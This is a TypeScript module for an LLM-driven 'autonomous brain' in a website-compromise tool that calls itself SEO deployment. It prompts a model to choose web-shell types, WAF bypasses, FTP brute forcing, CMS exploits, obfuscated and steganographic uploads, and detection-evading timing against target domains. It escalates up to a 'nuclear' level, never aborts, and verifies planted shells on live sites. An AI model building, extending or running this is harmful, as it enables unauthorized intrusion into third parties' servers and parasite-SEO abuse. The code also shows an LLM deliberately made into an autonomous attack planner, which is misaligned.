// ═══════════════════════════════════════════════════════════════
//  AI AUTONOMOUS BRAIN — LLM-Powered Decision Engine
//  Makes every step of Autonomous Friday intelligent:
//  1. Pre-Analysis: deep target analysis before attack
//  2. Strategy Selection: choose optimal attack path
//  3. Adaptive Retry: learn from failures, switch methods
//  4. Escalation Logic: decide when/how to escalate
//  5. Success Verification: verify files are truly accessible
//  6. Post-Deploy Optimization: improve after success
// ═══════════════════════════════════════════════════════════════

import { invokeLLM } from "./_core/llm";
import type { PreScreenResult } from "./ai-prescreening";
import type { WorldState, EscalationLevel, GoalType, AutonomousCallback } from "./autonomous-engine";

// ─── Types ───

export interface AIStrategy {
  primaryMethod: string;
  fallbackMethods: string[];
  shellType: "php" | "asp" | "aspx" | "jsp" | "multi";
  uploadApproach: "direct" | "steganography" | "cms_exploit" | "ftp" | "webdav" | "api" | "parallel";
  wafBypass: string | null;
  obfuscation: "none" | "basic" | "advanced" | "polymorphic";
  timing: "fast" | "slow_drip" | "burst" | "random_delay";
  reasoning: string;
  confidence: number; // 0-100
  estimatedSuccessRate: number; // 0-100
  riskLevel: "low" | "medium" | "high" | "extreme";
}

export interface AIDecision {
  action: "continue" | "escalate" | "switch_method" | "switch_goal" | "abort" | "retry_with_changes";
  reasoning: string;
  suggestedMethod?: string;
  suggestedGoal?: GoalType;
  suggestedEscalation?: EscalationLevel;
  changes: Record<string, unknown>;
  confidence: number;
  timestamp: number;
}

export interface AIVerification {
  url: string;
  accessible: boolean;
  statusCode: number;
  contentType: string | null;
  isShell: boolean;
  isRedirect: boolean;
  redirectTarget: string | null;
  wafBlocked: boolean;
  reasoning: string;
}

export interface AIPostDeployReport {
  overallSuccess: boolean;
  successRate: number;
  improvements: string[];
  risks: string[];
  nextSteps: string[];
  lessonsLearned: string[];
}

// ─── AI Brain Core ───

export class AIAutonomousBrain {
  private decisions: AIDecision[] = [];
  private strategies: AIStrategy[] = [];
  private failurePatterns: Map<string, number> = new Map();
  private successPatterns: Map<string, number> = new Map();
  private onProgress: AutonomousCallback;

  constructor(onProgress: AutonomousCallback) {
    this.onProgress = onProgress;
  }

  // ═══════════════════════════════════════════════
  // 1. PRE-ANALYSIS — Deep target analysis
  // ═══════════════════════════════════════════════

  async analyzeTarget(
    domain: string,
    prescreen: PreScreenResult | null,
  ): Promise<AIStrategy> {
    this.onProgress({
      type: "ai_reasoning",
      layer: 1,
      detail: `🧠 AI Brain: Analyzing target ${domain}...`,
      data: { phase: "pre_analysis" },
    });

    // Build context from prescreen
    const context = this.buildTargetContext(domain, prescreen);

    try {
      const response = await invokeLLM({
        messages: [
          {
            role: "system",
            content: `You are an autonomous SEO deployment AI strategist. Analyze the target and recommend the optimal attack strategy. Return JSON only.

Available methods: direct_upload, multipart_upload, put_upload, steganography_gif, steganography_png, php_polymorphic, asp_shell, aspx_shell, jsp_shell, ftp_brute, webdav_put, cms_wordpress_exploit, cms_joomla_exploit, cms_drupal_exploit, api_endpoint, chunked_upload, boundary_manipulation, htaccess_bypass, user_ini_bypass, double_extension, parallel_multi_vector

Available shell types: php, asp, aspx, jsp, multi (try all)
Upload approaches: direct, steganography, cms_exploit, ftp, webdav, api, parallel
WAF bypass techniques: boundary_manipulation, chunked_encoding, content_type_confusion, unicode_normalization, double_encoding, null_byte, case_randomization
Obfuscation levels: none, basic, advanced, polymorphic
Timing strategies: fast (all at once), slow_drip (spread over time), burst (rapid fire), random_delay (random intervals)`,
          },
          {
            role: "user",
            content: `Target Analysis:
${context}

Based on this analysis, what is the optimal attack strategy? Consider:
1. Server type and CMS to choose the right shell type
2. WAF presence to choose bypass technique
3. Available upload paths to choose upload approach
4. Security level to choose obfuscation level
5. Risk of detection to choose timing strategy

Return JSON: { "primaryMethod": string, "fallbackMethods": string[], "shellType": "php"|"asp"|"aspx"|"jsp"|"multi", "uploadApproach": "direct"|"steganography"|"cms_exploit"|"ftp"|"webdav"|"api"|"parallel", "wafBypass": string|null, "obfuscation": "none"|"basic"|"advanced"|"polymorphic", "timing": "fast"|"slow_drip"|"burst"|"random_delay", "reasoning": string, "confidence": number, "estimatedSuccessRate": number, "riskLevel": "low"|"medium"|"high"|"extreme" }`,
          },
        ],
        response_format: {
          type: "json_schema",
          json_schema: {
            name: "ai_strategy",
            strict: true,
            schema: {
              type: "object",
              properties: {
                primaryMethod: { type: "string" },
                fallbackMethods: { type: "array", items: { type: "string" } },
                shellType: { type: "string", enum: ["php", "asp", "aspx", "jsp", "multi"] },
                uploadApproach: { type: "string", enum: ["direct", "steganography", "cms_exploit", "ftp", "webdav", "api", "parallel"] },
                wafBypass: { type: ["string", "null"] },
                obfuscation: { type: "string", enum: ["none", "basic", "advanced", "polymorphic"] },
                timing: { type: "string", enum: ["fast", "slow_drip", "burst", "random_delay"] },
                reasoning: { type: "string" },
                confidence: { type: "number" },
                estimatedSuccessRate: { type: "number" },
                riskLevel: { type: "string", enum: ["low", "medium", "high", "extreme"] },
              },
              required: [
                "primaryMethod", "fallbackMethods", "shellType", "uploadApproach",
                "wafBypass", "obfuscation", "timing", "reasoning", "confidence",
                "estimatedSuccessRate", "riskLevel",
              ],
              additionalProperties: false,
            },
          },
        },
      });

      const content = response?.choices?.[0]?.message?.content;
      const strategy: AIStrategy = typeof content === "string" ? JSON.parse(content) : this.getDefaultStrategy(prescreen);

      this.strategies.push(strategy);

      this.onProgress({
        type: "ai_reasoning",
        layer: 1,
        detail: `🧠 AI Strategy: ${strategy.primaryMethod} → ${strategy.shellType} shell, ${strategy.uploadApproach} upload, confidence ${strategy.confidence}%`,
        data: { strategy },
      });

      return strategy;
    } catch (e) {
      const fallback = this.getDefaultStrategy(prescreen);
      this.strategies.push(fallback);
      return fallback;
    }
  }

  // ═══════════════════════════════════════════════
  // 2. ADAPTIVE DECISION — Learn from results
  // ═══════════════════════════════════════════════

  async makeDecision(
    world: WorldState,
    currentEscalation: EscalationLevel,
    currentGoal: GoalType,
    failedAttempts: Array<{ method: string; error: string }>,
    cycle: number,
    maxCycles: number,
  ): Promise<AIDecision> {
    // Track failure patterns
    for (const fail of failedAttempts.slice(-5)) {
      const key = fail.method;
      this.failurePatterns.set(key, (this.failurePatterns.get(key) || 0) + 1);
    }

    // Build failure summary
    const failureSummary = Array.from(this.failurePatterns.entries())
      .map(([method, count]) => `${method}: ${count}x`)
      .join(", ");

    // Build success summary
    const successSummary = Array.from(this.successPatterns.entries())
      .map(([method, count]) => `${method}: ${count}x`)
      .join(", ");

    try {
      const response = await invokeLLM({
        messages: [
          {
            role: "system",
            content: `You are an autonomous AI decision engine. Based on the current state, decide the next action. Return JSON only.

Actions:
- "continue": keep going with current strategy
- "escalate": increase aggression level
- "switch_method": try a different upload method
- "switch_goal": lower the goal bar (e.g., full_deploy → file_placement)
- "retry_with_changes": retry with specific modifications
- "abort": give up (only if truly impossible)

Escalation levels: cautious, moderate, aggressive, reckless, desperate, nuclear
Goals: full_deploy, file_placement, shell_access, parasite_seo, quick_test`,
          },
          {
            role: "user",
            content: `Current State:
- Cycle: ${cycle}/${maxCycles}
- Goal: ${currentGoal}
- Escalation: ${currentEscalation}
- Hosts found: ${world.hosts.length}
- Shells: ${world.shellUrls.length}
- Deployed: ${world.deployedFiles.length}
- Verified: ${world.verifiedUrls.length}
- Failed attempts: ${world.failedAttempts.length}
- Upload paths: ${world.uploadPaths.length}
- Vulnerabilities: ${world.vulns.length}

Failure patterns: ${failureSummary || "none"}
Success patterns: ${successSummary || "none"}
Previous strategies: ${this.strategies.map(s => s.primaryMethod).join(", ") || "none"}

What should be the next action?

Return JSON: { "action": string, "reasoning": string, "suggestedMethod": string|null, "suggestedGoal": string|null, "suggestedEscalation": string|null, "changes": object, "confidence": number }`,
          },
        ],
        response_format: {
          type: "json_schema",
          json_schema: {
            name: "ai_decision",
            strict: true,
            schema: {
              type: "object",
              properties: {
                action: { type: "string", enum: ["continue", "escalate", "switch_method", "switch_goal", "retry_with_changes", "abort"] },
                reasoning: { type: "string" },
                suggestedMethod: { type: ["string", "null"] },
                suggestedGoal: { type: ["string", "null"] },
                suggestedEscalation: { type: ["string", "null"] },
                changes: { type: "object", additionalProperties: true },
                confidence: { type: "number" },
              },
              required: ["action", "reasoning", "suggestedMethod", "suggestedGoal", "suggestedEscalation", "changes", "confidence"],
              additionalProperties: false,
            },
          },
        },
      });

      const content = response?.choices?.[0]?.message?.content;
      const parsed = typeof content === "string" ? JSON.parse(content) : null;

      const decision: AIDecision = {
        action: parsed?.action || "continue",
        reasoning: parsed?.reasoning || "Continuing with current strategy",
        suggestedMethod: parsed?.suggestedMethod || undefined,
        suggestedGoal: parsed?.suggestedGoal as GoalType | undefined,
        suggestedEscalation: parsed?.suggestedEscalation as EscalationLevel | undefined,
        changes: parsed?.changes || {},
        confidence: parsed?.confidence || 50,
        timestamp: Date.now(),
      };

      this.decisions.push(decision);

      this.onProgress({
        type: "decision",
        detail: `🧠 AI Decision: ${decision.action} — ${decision.reasoning}`,
        data: { decision },
      });

      return decision;
    } catch (e) {
      // Fallback: rule-based decision
      return this.ruleBasedDecision(world, currentEscalation, currentGoal, cycle, maxCycles);
    }
  }

  // ═══════════════════════════════════════════════
  // 3. SMART VERIFICATION — Verify files are real
  // ═══════════════════════════════════════════════

  async verifyDeployment(urls: string[]): Promise<AIVerification[]> {
    const results: AIVerification[] = [];

    for (const url of urls) {
      try {
        const resp = await fetch(url, {
          method: "GET",
          signal: AbortSignal.timeout(15000),
          redirect: "manual",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          },
        });

        const contentType = resp.headers.get("content-type");
        const status = resp.status;
        let body = "";
        try { body = await resp.text(); } catch {}

        // Check for WAF blocks
        const wafBlocked = status === 403 || status === 406 ||
          body.includes("Access Denied") ||
          body.includes("Forbidden") ||
          body.includes("blocked") ||
          body.includes("Cloudflare") ||
          body.includes("Security Check");

        // Check if it's a shell
        const isShell = body.includes("<?php") ||
          body.includes("eval(") ||
          body.includes("system(") ||
          body.includes("shell_exec") ||
          body.includes("passthru") ||
          (status === 200 && body.length < 100 && !body.includes("<html"));

        // Check redirect
        const isRedirect = status >= 300 && status < 400;
        const redirectTarget = isRedirect ? resp.headers.get("location") : null;

        const accessible = status === 200 && !wafBlocked;

        results.push({
          url,
          accessible,
          statusCode: status,
          contentType,
          isShell: accessible && isShell,
          isRedirect,
          redirectTarget,
          wafBlocked,
          reasoning: accessible
            ? `File accessible (${status}, ${contentType})`
            : wafBlocked
              ? `WAF blocked (${status})`
              : `Not accessible (${status})`,
        });

        if (accessible) {
          this.successPatterns.set("verify", (this.successPatterns.get("verify") || 0) + 1);
        }
      } catch (e) {
        results.push({
          url,
          accessible: false,
          statusCode: 0,
          contentType: null,
          isShell: false,
          isRedirect: false,
          redirectTarget: null,
          wafBlocked: false,
          reasoning: `Connection failed: ${e instanceof Error ? e.message : "timeout"}`,
        });
      }
    }

    this.onProgress({
      type: "ai_reasoning",
      detail: `🧠 AI Verification: ${results.filter(r => r.accessible).length}/${results.length} accessible`,
      data: { verifications: results.map(r => ({ url: r.url, ok: r.accessible, status: r.statusCode })) },
    });

    return results;
  }

  // ═══════════════════════════════════════════════
  // 4. POST-DEPLOY ANALYSIS — Optimize & report
  // ═══════════════════════════════════════════════

  async postDeployAnalysis(
    world: WorldState,
    duration: number,
    goal: GoalType,
    goalMet: boolean,
  ): Promise<AIPostDeployReport> {
    try {
      const response = await invokeLLM({
        messages: [
          {
            role: "system",
            content: "You are an SEO deployment analyst. Analyze the deployment results and provide actionable insights. Return JSON only.",
          },
          {
            role: "user",
            content: `Deployment Results:
- Goal: ${goal} → ${goalMet ? "SUCCESS" : "FAILED"}
- Duration: ${Math.round(duration / 1000)}s
- Hosts: ${world.hosts.length}
- Shells: ${world.shellUrls.length} (${world.shellUrls.join(", ") || "none"})
- Deployed: ${world.deployedFiles.length} files
- Verified: ${world.verifiedUrls.length} URLs
- Failed: ${world.failedAttempts.length} attempts
- Failure patterns: ${Array.from(this.failurePatterns.entries()).map(([m, c]) => `${m}:${c}`).join(", ") || "none"}
- Strategies used: ${this.strategies.length}
- Decisions made: ${this.decisions.length}

Provide analysis with improvements, risks, next steps, and lessons learned.

Return JSON: { "overallSuccess": boolean, "successRate": number, "improvements": string[], "risks": string[], "nextSteps": string[], "lessonsLearned": string[] }`,
          },
        ],
        response_format: {
          type: "json_schema",
          json_schema: {
            name: "post_deploy_report",
            strict: true,
            schema: {
              type: "object",
              properties: {
                overallSuccess: { type: "boolean" },
                successRate: { type: "number" },
                improvements: { type: "array", items: { type: "string" } },
                risks: { type: "array", items: { type: "string" } },
                nextSteps: { type: "array", items: { type: "string" } },
                lessonsLearned: { type: "array", items: { type: "string" } },
              },
              required: ["overallSuccess", "successRate", "improvements", "risks", "nextSteps", "lessonsLearned"],
              additionalProperties: false,
            },
          },
        },
      });

      const content = response?.choices?.[0]?.message?.content;
      const report: AIPostDeployReport = typeof content === "string"
        ? JSON.parse(content)
        : {
            overallSuccess: goalMet,
            successRate: goalMet ? 100 : 0,
            improvements: [],
            risks: [],
            nextSteps: [],
            lessonsLearned: [],
          };

      this.onProgress({
        type: "ai_reasoning",
        detail: `🧠 AI Post-Deploy: success=${report.overallSuccess}, rate=${report.successRate}%, ${report.improvements.length} improvements`,
        data: { report },
      });

      return report;
    } catch {
      return {
        overallSuccess: goalMet,
        successRate: goalMet ? 100 : (world.verifiedUrls.length > 0 ? 50 : 0),
        improvements: ["Try different upload methods", "Increase obfuscation"],
        risks: ["Detection by WAF", "File removal"],
        nextSteps: goalMet ? ["Monitor deployed files"] : ["Retry with escalated strategy"],
        lessonsLearned: Array.from(this.failurePatterns.entries()).map(([m, c]) => `${m} failed ${c} times`),
      };
    }
  }

  // ═══════════════════════════════════════════════
  // 5. SUGGEST NEXT TARGET METHOD — Based on history
  // ═══════════════════════════════════════════════

  suggestNextMethod(failedMethods: string[]): string {
    const allMethods = [
      "multipart_upload", "put_upload", "direct_upload",
      "steganography_gif", "steganography_png",
      "php_polymorphic", "asp_shell", "aspx_shell", "jsp_shell",
      "ftp_brute", "webdav_put",
      "cms_wordpress_exploit", "cms_joomla_exploit",
      "api_endpoint", "chunked_upload",
      "boundary_manipulation", "htaccess_bypass",
      "double_extension", "parallel_multi_vector",
    ];

    // Sort by least failures
    const sorted = allMethods
      .filter(m => !failedMethods.includes(m))
      .sort((a, b) => {
        const aFail = this.failurePatterns.get(a) || 0;
        const bFail = this.failurePatterns.get(b) || 0;
        const aSuccess = this.successPatterns.get(a) || 0;
        const bSuccess = this.successPatterns.get(b) || 0;
        return (bSuccess - bFail) - (aSuccess - aFail);
      });

    return sorted[0] || "parallel_multi_vector";
  }

  // ═══════════════════════════════════════════════
  // INTERNAL HELPERS
  // ═══════════════════════════════════════════════

  private buildTargetContext(domain: string, prescreen: PreScreenResult | null): string {
    if (!prescreen) {
      return `Domain: ${domain}\nNo pre-screening data available. Use aggressive multi-method approach.`;
    }

    return `Domain: ${domain}
Server: ${prescreen.serverType || "unknown"} ${prescreen.serverVersion || ""}
CMS: ${prescreen.cms || "none"} ${prescreen.cmsVersion || ""}
PHP: ${prescreen.phpVersion || "unknown"}
OS: ${prescreen.osGuess || "unknown"}
Hosting: ${prescreen.hostingProvider || "unknown"}
WAF: ${prescreen.wafDetected || "none"} (strength: ${prescreen.wafStrength})
Security Score: ${prescreen.securityScore}/100
SSL: ${prescreen.sslInfo?.enabled ? "yes" : "no"}
Open Ports: ${prescreen.openPorts?.map(p => `${p.port}/${p.service}`).join(", ") || "none"}
FTP: ${prescreen.ftpAvailable ? "available" : "no"}
WebDAV: ${prescreen.webdavAvailable ? "available" : "no"}
Writable Paths: ${prescreen.writablePaths?.join(", ") || "none"}
Upload Endpoints: ${prescreen.uploadEndpoints?.join(", ") || "none"}
CMS Plugins: ${prescreen.cmsPlugins?.join(", ") || "none"}
Known Vulns: ${prescreen.knownVulnerabilities?.map(v => v.cve).join(", ") || "none"}
File Manager: ${prescreen.fileManagerDetected ? "detected" : "no"}
XMLRPC: ${prescreen.xmlrpcAvailable ? "available" : "no"}
REST API: ${prescreen.restApiAvailable ? "available" : "no"}
Directory Listing: ${prescreen.directoryListingPaths?.join(", ") || "none"}
Success Probability: ${prescreen.overallSuccessProbability}%
Risk Level: ${prescreen.riskLevel}
AI Difficulty: ${prescreen.aiEstimatedDifficulty}
AI Recommended Methods: ${prescreen.aiRecommendedMethods?.join(", ") || "none"}`;
  }

  private getDefaultStrategy(prescreen: PreScreenResult | null): AIStrategy {
    // Rule-based fallback when LLM is unavailable
    const hasWaf = prescreen?.wafDetected && prescreen.wafStrength !== "none";
    const hasCms = prescreen?.cms;
    const hasFtp = prescreen?.ftpAvailable;
    const hasWebdav = prescreen?.webdavAvailable;

    let primaryMethod = "multipart_upload";
    let shellType: AIStrategy["shellType"] = "php";
    let uploadApproach: AIStrategy["uploadApproach"] = "direct";
    let obfuscation: AIStrategy["obfuscation"] = "basic";

    if (hasWaf) {
      primaryMethod = "boundary_manipulation";
      obfuscation = "polymorphic";
      uploadApproach = "parallel";
    }
    if (hasCms === "WordPress") {
      primaryMethod = "cms_wordpress_exploit";
      uploadApproach = "cms_exploit";
    }
    if (hasFtp) {
      primaryMethod = "ftp_brute";
      uploadApproach = "ftp";
    }
    if (hasWebdav) {
      primaryMethod = "webdav_put";
      uploadApproach = "webdav";
    }

    // Detect server platform for shell type
    if (prescreen?.serverType) {
      const server = prescreen.serverType.toLowerCase();
      if (server.includes("iis")) shellType = "aspx";
      else if (server.includes("tomcat") || server.includes("java")) shellType = "jsp";
    }

    return {
      primaryMethod,
      fallbackMethods: ["parallel_multi_vector", "steganography_gif", "php_polymorphic", "double_extension"],
      shellType,
      uploadApproach,
      wafBypass: hasWaf ? "boundary_manipulation" : null,
      obfuscation,
      timing: hasWaf ? "slow_drip" : "fast",
      reasoning: "Rule-based fallback strategy (LLM unavailable)",
      confidence: 40,
      estimatedSuccessRate: prescreen?.overallSuccessProbability || 30,
      riskLevel: hasWaf ? "high" : "medium",
    };
  }

  private ruleBasedDecision(
    world: WorldState,
    currentEscalation: EscalationLevel,
    currentGoal: GoalType,
    cycle: number,
    maxCycles: number,
  ): AIDecision {
    // Aggressive rule-based fallback — NEVER abort, always try harder
    const escalationOrder: EscalationLevel[] = ["cautious", "moderate", "aggressive", "reckless", "desperate", "nuclear"];
    const currentIdx = escalationOrder.indexOf(currentEscalation);

    let action: AIDecision["action"] = "continue";
    let reasoning = "";

    if (world.verifiedUrls.length > 0 || world.deployedFiles.length > 0) {
      action = "continue";
      reasoning = "Files deployed/verified, continuing to maximize coverage";
    } else if (world.failedAttempts.length >= 2 && currentIdx < escalationOrder.length - 1) {
      // Escalate after just 2 failures (was 5)
      action = "escalate";
      reasoning = `${world.failedAttempts.length} failures, escalating to ${escalationOrder[currentIdx + 1]}`;
    } else if (world.failedAttempts.length >= 3) {
      // Switch method after 3 failures (was 10)
      action = "switch_method";
      reasoning = `${world.failedAttempts.length} failures, switching to untried method`;
    } else if (cycle > maxCycles * 0.8 && currentGoal === "full_deploy" && world.deployedFiles.length === 0) {
      // Only lower goal if truly running out of cycles AND zero progress
      action = "switch_goal";
      reasoning = "Running out of cycles with zero progress, lowering goal to file_placement";
    } else if (currentIdx >= escalationOrder.length - 1 && world.failedAttempts.length > 5) {
      // At nuclear level with many failures: retry with changes, NEVER abort
      action = "retry_with_changes";
      reasoning = "At maximum escalation, retrying with different parameters";
    }

    const decision: AIDecision = {
      action,
      reasoning,
      suggestedEscalation: action === "escalate" ? escalationOrder[Math.min(currentIdx + 1, escalationOrder.length - 1)] : undefined,
      suggestedGoal: action === "switch_goal" ? "file_placement" : undefined,
      suggestedMethod: action === "switch_method" || action === "retry_with_changes"
        ? this.suggestNextMethod(world.failedAttempts.map(f => f.method))
        : undefined,
      changes: action === "retry_with_changes" ? { increaseTimeout: true, usePolymorphic: true, tryAllPlatforms: true } : {},
      confidence: 60,
      timestamp: Date.now(),
    };

    this.decisions.push(decision);
    return decision;
  }

  // ─── Getters ───

  getDecisions(): AIDecision[] {
    return this.decisions;
  }

  getStrategies(): AIStrategy[] {
    return this.strategies;
  }

  getFailurePatterns(): Record<string, number> {
    return Object.fromEntries(this.failurePatterns);
  }

  getSuccessPatterns(): Record<string, number> {
    return Object.fromEntries(this.successPatterns);
  }

  recordSuccess(method: string) {
    this.successPatterns.set(method, (this.successPatterns.get(method) || 0) + 1);
  }

  recordFailure(method: string) {
    this.failurePatterns.set(method, (this.failurePatterns.get(method) || 0) + 1);
  }

  getSummary(): Record<string, unknown> {
    return {
      totalDecisions: this.decisions.length,
      totalStrategies: this.strategies.length,
      failurePatterns: this.getFailurePatterns(),
      successPatterns: this.getSuccessPatterns(),
      lastDecision: this.decisions[this.decisions.length - 1] || null,
      lastStrategy: this.strategies[this.strategies.length - 1] || null,
    };
  }
}
